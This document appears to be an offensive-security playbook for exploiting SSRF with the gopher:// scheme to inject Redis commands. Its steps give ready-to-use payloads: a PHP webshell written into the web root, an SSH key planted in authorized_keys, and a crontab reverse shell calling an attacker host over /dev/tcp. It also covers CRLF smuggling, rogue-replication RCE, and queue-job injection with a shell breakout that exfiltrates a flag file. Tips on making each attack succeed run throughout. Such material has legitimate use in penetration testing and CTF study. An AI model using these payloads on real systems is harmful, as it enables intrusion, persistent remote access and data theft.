# Redis Injection via SSRF / Gopher

## When this applies

- The application has an SSRF vulnerability that allows the `gopher://` scheme.
- A Redis instance is reachable from the application server (commonly `127.0.0.1:6379`).
- Goal: turn SSRF into RCE / file write / lateral movement via Redis commands.

## Technique

Redis listens on a plain-text protocol (RESP). The Gopher URI scheme allows arbitrary TCP payloads. By crafting `gopher://127.0.0.1:6379/_<RESP_COMMANDS>`, the SSRF triggers a Redis command sequence that writes a webshell, SSH key, or crontab entry to disk.

## Steps

### 1. Confirm Redis is reachable

```
gopher://127.0.0.1:6379/_INFO
gopher://127.0.0.1:6379/_PING
```

Trigger via the SSRF entry point (e.g. `?url=gopher://127.0.0.1:6379/_INFO`). If Redis responds, it confirms the path.

### 2. Webshell write (PHP/Apache target)

```
gopher://127.0.0.1:6379/_<RESP-encoded sequence>
```

Sequence:
```
SET 1 "<?php system($_GET['c']);?>"
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SAVE
```

Then access `http://target/shell.php?c=id`.

### 3. SSH key write (SSH access as the redis runtime user)

```
FLUSHALL                                        # clear stale RDB content from earlier attempts
SET 1 "\n\nssh-ed25519 AAAA<your_pubkey>\n\n"
CONFIG SET dir <REDIS_HOME>/.ssh                 # /root/.ssh if redis runs as root, /var/lib/redis/.ssh otherwise
CONFIG SET dbfilename authorized_keys
SAVE
```

Then `ssh -i id_ed25519 <REDIS_USER>@<TARGET>`.

Key hygiene that often saves an hour:
- **Prefer ed25519 over RSA-2048.** Modern OpenSSH clients (≥9) refuse `ssh-rsa` SHA1-signed keys by default; `+ssh-rsa` / `HostKeyAlgorithms=+ssh-rsa` overrides are flaky. ed25519 just works.
- **Always `FLUSHALL` between attempts.** RDB on `SAVE` writes binary noise *plus* current keys. Stacking attempts merges old binary into the same file and SSHd's parser sometimes can't find the new key inside the bytes. A clean DB → clean RDB → clean `authorized_keys`.
- **`\n\n…\n\n` padding is mandatory** — RDB is binary, SSHd skips lines that aren't valid `authorized_keys` entries; padding ensures the public key sits on its own line.
- **`<REDIS_HOME>` matters.** If redis runs as the `redis` user (default Debian/Ubuntu), `/root/.ssh` is unwritable; use `/var/lib/redis/.ssh` (and SSH in as `redis`). Pivot from there with `su` / cracked secrets.

### 4. Crontab reverse shell

```
SET 1 "\n* * * * * root bash -i >& /dev/tcp/attacker/4444 0>&1\n"
CONFIG SET dir /var/spool/cron/crontabs
CONFIG SET dbfilename root
SAVE
```

Cron runs the new file every minute → reverse shell.

### 5. Use `Gopherus` to generate payloads

```bash
git clone https://github.com/tarunkant/Gopherus
python3 Gopherus.py --exploit redis
# Choose: PHP shell / SSH / Cron
# Provide path & payload
# Output: gopher://127.0.0.1:6379/_<URL-encoded RESP>
```

The output is ready to drop into the SSRF parameter.

### 6. CRLF injection variant (when not gopher)

Some SSRF primitives don't allow `gopher://` but DO allow CRLF in HTTP headers:

```
param=value%0d%0aCONFIG+SET+dir+/tmp%0d%0a
```

Smuggles Redis commands through an HTTP-style request to port 6379.

### 7. Slave replication RCE (Redis 4.x / 5.x)

When `CONFIG SET` is permitted but file-write paths are restricted (containers, jails):

```bash
# Use redis-rogue-server or Gopherus --exploit redis
# Master/slave replication can load a malicious .so module → RCE
```

### 8. Framework queue-job injection (when CONFIG SET is disabled)

Managed Redis (AWS ElastiCache, Redis Cloud) often disable `CONFIG SET`. Instead, inject serialized jobs into the framework's queue keys:

| Framework | Queue Key | Job Format |
|---|---|---|
| Laravel | `queues:default` | JSON with `job`, `data`, `uuid` fields |
| Rails / Sidekiq | `queue:default` | JSON with `class`, `args` fields |
| Celery | `celery` | JSON with `task`, `args`, `kwargs` fields |
| Bull (Node) | `bull:queue:wait` | JSON with `name`, `data` fields |

Example (Laravel):

```bash
# RPUSH a serialized job; if the job's code passes user data to system()/exec()/shell_exec():
#   system("echo '".$uuid."'>>logfile")
# Break out of single quotes: '; malicious_cmd; echo '
RPUSH queues:default '{"job":"App\\Jobs\\TargetJob","data":{"field":"\'; cat /flag > /var/www/html/public/out.txt; echo \'"}}'
```

Deliver the RPUSH via gopher SSRF: encode the RESP command, URL-encode for the gopher URL.

## Verifying success

- Webshell: `curl http://target/shell.php?c=id` returns `uid=33(www-data) ...`.
- SSH key: `ssh -i ./id_rsa root@target` succeeds.
- Crontab: incoming connection on attacker:4444 within 60 seconds.
- Queue-job: side-effect file/log appears on target as the malicious job runs.

## Common pitfalls

- Redis's `CONFIG SET dir` requires the redis user to have write permission on the target directory — `/root/.ssh` requires Redis running as root (common with default installs, broken on Docker).
- Webshell write requires Apache/Nginx to serve PHP from the redis dump dir — adjust path to match the running web server's docroot.
- Newer Redis versions (≥ 6.0) disable `CONFIG SET dir` and `CONFIG SET dbfilename` in protected mode — fall back to queue-job injection.
- SSRF primitive must allow `gopher://` — many SSRF defenses block non-HTTP schemes. Test with `dict://`, `file://`, `gopher://` to find allowed schemes.
- AUTH-protected Redis: prefix sequence with `AUTH <password>` (recovered from env vars or config files).

## Tools

- Gopherus (`--exploit redis` / `mysql` / `fastcgi`) — auto-generates gopher SSRF payloads.
- redis-cli (sandbox testing of crafted commands).
- redis-rogue-server (for slave replication RCE on Redis 4.x/5.x).
- Burp Suite Repeater for delivering crafted SSRF requests.
